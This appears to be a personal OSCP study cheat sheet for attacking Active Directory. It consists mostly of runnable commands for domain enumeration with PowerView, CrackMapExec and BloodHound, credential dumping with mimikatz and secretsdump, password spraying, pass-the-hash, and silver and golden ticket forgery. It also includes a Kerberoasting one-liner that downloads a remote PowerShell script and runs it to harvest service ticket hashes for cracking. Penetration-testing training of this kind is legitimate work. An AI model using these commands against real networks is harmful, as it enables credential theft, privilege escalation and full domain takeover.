# OSCP-shortsheet
- 🚀 Prepared as part of my OSCP journey.

#Resources
- https://hacktricks.boitatech.com.br/windows/active-directory-methodology/silver-ticket
- https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
- https://github.com/Sp4c3Tr4v3l3r/OSCP/blob/main/Active%20Directory.md
- https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/
- https://blog.certcube.com/kerberoasting-simplified-attack-and-defense/
- https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/

# Table of Content
- [Active Directory Pentesting](#active-directory-pentesting)
  - [Enumeration](#enumeration)
    - [Powerview](#powerview)
   
# Active Directory Pentesting

## Enumeration

- To check local administrators in domain joined machine

```powershell
net localgroup Administrators
```

### Powerview

```bash
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetDomain #basic information about the domain
Get-NetUser #list of all users in the domain
# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is sideheading for   the output of above command. we can select any number of them seperated by comma.
Get-NetGroupMember -GroupName "Domain Admins"       #get SID, Group Doamin name, group name
Get-NetGroup # enumerate domain groups
Get-NetGroup "group name" # information from specific group
Get-NetComputer # enumerate the computer objects in the domain
Find-LocalAdminAccess # scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
Convert-SidToName <sid/objsid> # converting SID/ObjSID to name 

# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights 

Find-DomainShare #find the shares in the domain

Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts

Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
```
###Crackmapexec

```bash
# Enumerate users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users

# Perform RID Bruteforce to get users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute

# Enumerate domain groups
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups

# Enumerate local users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users

# Generate a list of relayable hosts (SMB Signing disabled)
crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt

# Enumerate available shares
crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares

# Get the active sessions
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions

# Check logged in users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers

# Get the password policy
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
```

### Bloodhound

- Collection methods - database

```bash
# Sharphound - transfer sharphound.ps1 into the compromised machine
Import-Module .\Sharphound.ps1 
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine
      e.g. Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip
```

- Running Bloodhound

```bash
sudo neo4j console
# then upload the .json files obtained

sudo bloodhound
# then upload the .zip files obtained
```

## **Attacking Active Directory Authentication**

<aside>
💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.
</aside>

### Tools to dump hashes (tool: secretsdump.py https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
```bash
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
```

### Password Spraying

- Dump passwords from memory using mimikatz
```bash
PS C:\tmp > mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dumped_pwds.txt
```

- Spray with known password on list of found usernames
```bash
# Crackmapexec - check if the output shows 'Pwned!'
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
        e.g. crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
        e.g. crackmapexec smb 192.168.1xx.100 -u users.txt -p 'ESMWaterP1p3S!'
        e.g. crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
        users.txt from Get-NetUser

# Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```

- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1)
  ```bash
  .\Spray-Passwords.ps1
  ```

### Pass the hash

- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)

```powershell
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Pass the hash

```bash
crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
        crackmapexec 192. 168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
```

### Silver Tickets

-Silver Ticket Default Groups:
<aside>
Domain Users SID: S-1-5-21<DOMAINID>-513
Domain Admins SID: S-1-5-21<DOMAINID>-512
Schema Admins SID: S-1-5-21<DOMAINID>-518
Enterprise Admins SID: S-1-5-21<DOMAINID>-519
Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
</aside>

- In Windows, Mimikatz can be used to craft the ticket. Next, the ticket is injected with Rubeus, and finally a remote shell can be obtained thanks to PsExec.
  
- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)

```powershell
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Obtaining Domain SID

```powershell
ps> whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
```

- Forging silver ticket (TGS) Ft **Mimikatz**
<aside>
Forging a TGS (and included PAC)
Requires the machine account password (key) from the KDC
Can be used to directly access any service (without touching DC)
</aside>

```bash
mimikatz.exe
prvilege::debug
#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session using /ptt
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ptt
      mimikatz # kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-1274281563 /target: CorpSqlServer.corp.com: 1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session and output to ticket.kirbi using /ticket flag
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ticket
#using aeskey generate the Silver Ticket (TGS) and inject it into memory
kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME

# Checking available tickets in memory with klist
ps> klist
```

- Inject the ticket (not needed if the TGS is already loaded in current session)

```bash
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>
        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi
```

- Obtain a shell

```bash
cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
```

### Golden Ticket Ft **Mimikatz**
<aside>
Forging a TGT (and the included PAC)
Requires tje krbtgt key, the “master” encryption key from the KDC
Can be used to request any TGS from the Domain Controller
</aside>

```bash
#getting krbtgt (user: krbtgt, NTLM: krbtgt hash)
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch

#using krbtgt hash via mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
        mimikatz # kerberos :: golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt
# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi

 #List tickets in memory
klist

#using krbtgt hash via Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi

#After running above code to generate golden ticket, the golden ticket will be automaticallys submiited for current session
#to launch cmd using the current session validated by golden ticket
mimikatz # misc::cmd
mimikatz # misc::cmd whoami
```

#Kerberoasting
<aside>
Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password. 
Kerberoasting requires a valid domain account.
Three step process:
- Find SPN tied to user accounts through LDAP (service accounts)
- Request a TGS for each SPN
- Crack the TGS offline to recover the service account's password
</aside>

```bash
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"

# cracking TGS hashes
hashcat -m 13100 kerb-Hash0.txt wordlist.txt --force
        hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
```
